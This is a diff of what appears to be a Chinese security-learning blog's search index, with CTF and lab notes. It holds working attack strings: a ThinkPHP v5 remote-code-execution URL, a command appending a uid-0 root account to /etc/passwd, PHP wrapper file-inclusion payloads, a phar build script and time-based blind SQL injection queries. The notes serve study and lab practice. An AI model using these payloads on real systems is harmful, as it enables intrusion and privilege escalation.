 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;shell.txt&quot;</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);  <span class="comment">//压缩的文件和内容</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  <span class="comment">//计算签名</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/07/04/file-include/file_include\image-20230704160059102.png" alt="image-20230704160059102"></p>
+<p><img src="/2023/07/04/file-include/image-20230704155415286.png" alt="image-20230704155415286"></p>
 <p>更改文件后缀可以绕过一些限制</p>
-<p><img src="/2023/07/04/file-include/file_include\image-20230704160131320.png" alt="image-20230704160131320"></p>
+<p><img src="/2023/07/04/file-include/image-20230704160131320.png" alt="image-20230704160131320"></p>
 <h3 id="zip-1"><a href="#zip-1" class="headerlink" title="zip://"></a>zip://</h3><p>使用zip协议时需要将#编码为%23</p>
 <p><img src="/2023/07/04/file-include/image-20230704160342014.png" alt="image-20230704160342014"></p>
 <p>利用条件：php&gt;=5.2(绝对路径)    php&gt;=5.29(相对/绝对路径)</p>
-<p><img src="/2023/07/04/file-include/file_include\image-20230704160342014.png" alt="image-20230704160342014"></p>
-<p><img src="/2023/07/04/file-include/image-20230704160407033.png" alt="image-20230704160407033"></p>
+<p><img src="/2023/07/04/file-include/image-20230704160228607.png" alt="image-20230704160228607"></p>
 <p>不管后缀是什么都会当成zip文件来解压</p>
 <h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p><img src="/2023/07/04/file-include/image-20230704160533301.png" alt="image-20230704160533301"></p>
 <p>利用条件</p>
@@ -818,84 +1271,6 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <h3 id="协议限制"><a href="#协议限制" class="headerlink" title="协议限制"></a>协议限制</h3><p><img src="/2023/07/04/file-include/image-20230704163540860.png" alt="image-20230704163540860"></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload：?filename=compress.zlib:<span class="comment">//data:/text/plain;base64,PD9waHAgcGhwaW5mbygp0z8%2b</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>经过base64编码PD9waHAgcGhwaW5mbygpOz8+，最后的+需要写成%<span class="number">2</span>b</span><br></pre></td></tr></table></figure>
 ]]></content>
-  </entry>
-  <entry>
-    <title>js原型链污染</title>
-    <url>/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>原型对象的学习和污染</p>
-<span id="more"></span>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702180603744.png" alt="image-20230702180603744"></p>
-<p>给出一个登陆界面，看到有注册，有url框，很容易会想到注入和爆破，但是题目要求说了不需要爆破，抓个包看看</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702180815052.png" alt="image-20230702180815052"></p>
-<p>很明显传递了两个参数username和password</p>
-<p>账户密码错误或为空会返回</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702181651762.png" alt="image-20230702181651762"></p>
-<p>检查注册页面</p>
-<p>成功注册</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702181924542.png" alt="image-20230702181924542"></p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182016261.png" alt="image-20230702182016261"></p>
-<p>注意到还有一个is admin选项</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182128449.png" alt="image-20230702182128449"></p>
-<p>会多出一个invite code选项，并且会前端检查是否填写</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182106478.png" alt="image-20230702182106478"></p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182211209.png" alt="image-20230702182211209"></p>
-<p>多两个参数，尝试更改参数，但是没有用。nmap进行端口扫描</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182532710.png" alt="image-20230702182532710"></p>
-<p>很多apache服务</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182553404.png" alt="image-20230702182553404"></p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182706094.png" alt="image-20230702182706094"></p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702182746936.png" alt="image-20230702182746936"></p>
-<p>经典漏洞远程执行</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702183653753.png" alt="image-20230702183653753"></p>
-<p>可能存在文件上传漏洞</p>
-<p>通过端口扫描得到两个可能存在漏洞的页面和一个php代码</p>
-<h2 id="thinkphp-v5"><a href="#thinkphp-v5" class="headerlink" title="thinkphp v5"></a>thinkphp v5</h2><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">构造url：ip/index.php?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span><span class="params">[0]</span>=<span class="title">system</span>&amp;<span class="title">vars</span><span class="params">[1]</span><span class="params">[]</span>=<span class="params">[linux指令]</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702183957488.png" alt="image-20230702183957488"></p>
-<p>得到我们是www-data用户</p>
-<p>nc尝试正向连接与反向连接均失败</p>
-<p>可以创建root权限用户，查看passwd表中书写格式</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702185059204.png" alt="image-20230702185059204"></p>
-<p>openssl生成用户并获得加密后的密码</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl</span> passwd -<span class="number">1</span> -salt<span class="meta"> [username] [password]</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702185209920.png" alt="image-20230702185209920"></p>
-<p>按照root格式写入passwd文件</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;root:<span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0 <span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
-<p>但是被拒绝</p>
-<p>查看系统版本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702190107598.png" alt="image-20230702190107598"></p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702190136068.png" alt="image-20230702190136068"></p>
-<p>找一下有没有合适的exploit</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702191918573.png" alt="image-20230702191918573"></p>
-<p>但是发现无法写入文件也无法切换到tmp下</p>
-<p>尝试定时任务提权也发现并没有可写权限的文件</p>
-<p>目前通过www-data提权方式走不通</p>
-<p>ls看看当前能访问的文件</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192713361.png" alt="image-20230702192713361"></p>
-<p>router.php<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192807453.png" alt="image-20230702192807453"></p>
-<p>index.php<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192902763.png" alt="image-20230702192902763"></p>
-<p>robots.txt<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702192934875.png" alt="image-20230702192934875"></p>
-<p>当前路径<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193207392.png" alt="image-20230702193207392"></p>
-<p>没有找到特别有用的信息，看一下文件上传页面，上传正常图片<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193401485.png" alt="image-20230702193401485"></p>
-<p>上传php图片时，而且是前端验证<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193515809.png" alt="image-20230702193515809"></p>
-<p>尝试图片马<br><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702193639916.png" alt="image-20230702193639916"></p>
-<p>存在端口的影响，绝对路径也很难用御剑爆破出来</p>
-<p>wp查看源码，得到是一个原型链污染</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200247737.png" alt="image-20230702200247737"></p>
-<p>就可以了</p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200658611.png" alt="image-20230702200658611"></p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200727563.png" alt="image-20230702200727563"></p>
-<h1 id="catcat"><a href="#catcat" class="headerlink" title="catcat"></a>catcat</h1><p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702200959138.png" alt="image-20230702200959138"></p>
-<p><img src="/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20230702201012248.png" alt="image-20230702201012248"></p>
-<p>可能存在任意文件读取漏洞</p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-        <tag>CATCTF</tag>
-      </tags>
   </entry>
   <entry>
     <title>C/S安装</title>
@@ -1086,7 +1461,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </tr>
 <tr>
 <td>web server</td>
-<td>192.168.153.141<br>192.168.73.143</td>
+<td>192.168.153.132<br>192.168.73.143</td>
 </tr>
 <tr>
 <td>domain</td>
@@ -1094,27 +1469,16 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </tr>
 <tr>
 <td>part</td>
-<td>192.168.73.150</td>
+<td>192.168.73.132</td>
 </tr>
 </tbody>
 </table>
 </div>
-<p>ping测试<br>pingkali攻击机<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630140629447.png" alt="image-20230630140629447"></p>
-<p>ping域用户<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230629094912234.png" alt="image-20230629094912234"></p>
-<p>ping域控<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132233547.png" alt="image-20230630132233547"></p>
-<p>kali攻击机pingweb服务器<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630140654946.png" alt="image-20230630140654946"></p>
-<p>域控pingwebserver<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132326642.png" alt="image-20230630132326642"></p>
-<p>域控ping域用户<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630130352905.png" alt="image-20230630130352905"></p>
-<p>域用户ping域控<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132612724.png" alt="image-20230630132612724"></p>
-<p>域用户pingwebserver<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132524457.png" alt="image-20230630132524457"></p>
-<p>可以发现webserver只允许自己ping别人，不允许别人ping自己，如果有管理员权限，win+r输入wf.msc启用imcp规则就可以。如果没有进行端口扫描时不可以用nmap中-sn功能</p>
-<p>域用户配置同网段下静态ip，静态dns设置为域控dns即可<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230629120535318.png" alt="image-20230629120535318"></p>
 <p>webserver开启phpstudy服务</p>
-<p>主机发现</p>
-<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630140833874.png" alt="image-20230630140833874"></p>
-<p>找到webserver：192.168.153.128</p>
-<p>端口扫描</p>
-<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630143825803.png" alt="image-20230630143825803"></p>
+<p>主机发现<br>同一C段进行扫描<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230709104041374.png" alt="image-20230709104041374"></p>
+<p>同一网段扫描<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630140833874.png" alt="image-20230630140833874"><br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230709104106822.png" alt="image-20230709104106822"></p>
+<p>找到webserver：192.168.153.132</p>
+<p>端口扫描<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230709104345022.png" alt="image-20230709104345022"><br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230709105610919.png" alt="image-20230709105610919"></p>
 <p>得到信息开启了80端口apache httpd服务，3306端口的mysql，以及操作系统是win server 2008等，访问http服务页面</p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630144121058.png" alt="image-20230630144121058"></p>
 <p>得到管理员邮箱可以进行钓鱼，服务器版本信息可以用于查看是否存在nday漏洞，绝对路径用于sql注入获得shell</p>
@@ -1125,6 +1489,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630145743448.png" alt="image-20230630145743448"><br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630145842255.png" alt="image-20230630145842255"><br>等共计找到70个页面<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630145957689.png" alt="image-20230630145957689"></p>
 <p>或者使用御剑只查看200的页面<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150122339.png" alt="image-20230630150122339"></p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150520576.png" alt="image-20230630150520576"></p>
+<p>指纹识别<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230709105732907.png" alt="image-20230709105732907"><br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230709110117557.png" alt="image-20230709110117557"></p>
 <p>敏感文件泄露</p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150545390.png" alt="image-20230630150545390"></p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150805895.png" alt="image-20230630150805895"></p>
@@ -1161,7 +1526,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p>caidao连接</p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630190052705.png" alt="image-20230630190052705"></p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630190037343.png" alt="image-20230630190037343"></p>
-<p>开启全局日志getshell，请注意执行select into outfile和load data infile 命令需要设置secure_file_priv参数为null</p>
+<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>开启全局日志getshell，请注意执行select into outfile和load data infile 命令需要设置secure_file_priv参数为null</p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630195616747.png" alt="image-20230630195616747"></p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630195629947.png" alt="image-20230630195629947"></p>
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630201528495.png" alt="image-20230630201528495"></p>
@@ -2067,6 +2432,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p>对于 HTTP，POP3，IMAP和SMTP，支持几种登录机制，如普通和MD5摘要等。</p>
 <figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">语法：hydra 参数 IP 服务</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line"><span class="deletion">-l login 小写，指定用户名进行破解</span></span><br><span class="line"><span class="deletion">-L file 大写，指定用户的用户名字典</span></span><br><span class="line"><span class="deletion">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span></span><br><span class="line"><span class="deletion">-P file 大写，用于指定密码字典。</span></span><br><span class="line"><span class="deletion">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span></span><br><span class="line"><span class="deletion">-M file 指定目标ip列表文件，批量破解。</span></span><br><span class="line"><span class="deletion">-o file 指定结果输出文件</span></span><br></pre></td></tr></table></figure>
 <h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">基础搜索：searchsploit &lt;搜索目标&gt;    范围：标题和路径</span><br><span class="line">-t 范围：标题</span><br><span class="line">-<span class="selector-tag">p</span> 漏洞编号，如-<span class="selector-tag">p</span> <span class="number">37292</span><span class="selector-class">.c</span>,会返还漏洞的url、本地路径等信息</span><br><span class="line"><span class="attr">--exclude</span>=<span class="string">&quot;过滤内容&quot;</span>  eg：<span class="attr">--excluded</span>=<span class="string">&quot;(PoC)|/dos/&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h2><p>网站指纹识别工具</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">whatweb [options] &lt;urls&gt;</span><br><span class="line">-i	指定要扫描的文件</span><br><span class="line">-v	详细显示扫描的结果</span><br><span class="line">-<span class="keyword">a</span>	指定运行级别</span><br><span class="line">	<span class="number">1</span>、tealthy 每个目标发送一次<span class="keyword">http</span>请求，并且会跟随重定向</span><br><span class="line">	<span class="number">2</span>、unused 不可用</span><br><span class="line">	<span class="number">3</span>、aggressive 每个目标发送少量的<span class="keyword">http</span>请求，这些请求时根据参数为<span class="number">1</span>时结果确定的</span><br><span class="line"><span class="number">4</span>、heavy 每个目标会发送大量的<span class="keyword">http</span>请求，会去尝试每一个插件</span><br></pre></td></tr></table></figure>
 <h2 id="burp-suite"><a href="#burp-suite" class="headerlink" title="burp suite"></a>burp suite</h2><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h4><p>将截获的数据包进行重放，达到身份认证等目的</p>
 <h4 id="前端验证码验证"><a href="#前端验证码验证" class="headerlink" title="前端验证码验证"></a>前端验证码验证</h4><p>验证码在js中，不会经过后台验证，只进行前端验证。<br>bp运行在浏览器和目标服务器之间的代理，可以直接越过验证码。</p>
 <h4 id="后端验证码绕过"><a href="#后端验证码绕过" class="headerlink" title="后端验证码绕过"></a>后端验证码绕过</h4><p>后端验证码刷新需要条件触发，验证码刷新存放在另一个文件中，bp对网址的登陆的请求数据包进行抓取，从而使得只执行登陆页面的数据包，不会点击登录按钮从而不会触发验证码刷新，从而一直运用一个正确的验证码就能够进行爆破</p>
@@ -3405,8 +3772,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
         <category>区块链</category>
       </categories>
       <tags>
-        <tag>区块链</tag>
         <tag>协议</tag>
+        <tag>区块链</tag>
       </tags>
   </entry>
   <entry>
@@ -3426,8 +3793,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
         <category>区块链</category>
       </categories>
       <tags>
-        <tag>区块链</tag>
         <tag>协议</tag>
+        <tag>区块链</tag>
       </tags>
   </entry>
   <entry>
@@ -3435,7 +3802,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
     <url>/2023/02/02/%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>搜罗到的一些好用的工具或者镜像辅助什么的</p>
 <span id="more"></span>
-<h2 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">pip install <span class="selector-attr">[需要安装的库]</span> -<span class="selector-tag">i</span> https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">pip install <span class="selector-attr">[需要安装的库]</span> -<span class="selector-tag">i</span> https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br></pre></td></tr></table></figure>
 <h2 id="接码平台"><a href="#接码平台" class="headerlink" title="接码平台"></a>接码平台</h2><p><a href="https://smspva.com/">Account activations via SMS | Receive SMS online | Smspva</a></p>
 <h2 id="dmg文件"><a href="#dmg文件" class="headerlink" title="dmg文件"></a>dmg文件</h2><p><a href="https://reincubate.com/dmg-extractor/">DMG Extractor: extract and read Mac DMG files on Windows (reincubate.com)</a></p>
 <h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
@@ -3443,6 +3810,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <h2 id="jsp阅读器"><a href="#jsp阅读器" class="headerlink" title="jsp阅读器"></a>jsp阅读器</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
 <h2 id="短链"><a href="#短链" class="headerlink" title="短链"></a>短链</h2><p>MRW短链接：<a href="http://home.mrw.so/">http://home.mrw.so/</a><br>百度短链接：<a href="https://dwz.cn/">https://dwz.cn/</a><br>谷歌短链接：<a href="https://goo.gl/">https://goo.gl/</a></p>
 <h2 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h2><p><a href="https://tool.lu/timestamp/">时间戳(Unix timestamp)转换工具 - 在线工具 (tool.lu)</a></p>
+<h2 id="base64加密解密"><a href="#base64加密解密" class="headerlink" title="base64加密解密"></a>base64加密解密</h2><p><a href="https://base64.us/">https://base64.us/</a></p>
+<h2 id="棱角社区"><a href="#棱角社区" class="headerlink" title="棱角社区"></a>棱角社区</h2><p><a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -5438,6 +5807,15 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
 <h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
 <h3 id="字段值"><a href="#字段值" class="headerlink" title="字段值"></a>字段值</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">查询<span class="keyword">user</span>字段的数据</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(*) <span class="keyword">from</span> users)=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">查询第一个数据的长度</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">爆出第一个数据值</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
 <p>可以看到时间盲注相比于布尔盲注只是多了一个if函数来执行sleep函数代替回显。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>靶场：<a href="https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7">https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7</a></p>
+<p>判断注入类型为数字型盲注无报错信息考虑使用时间盲注</p>
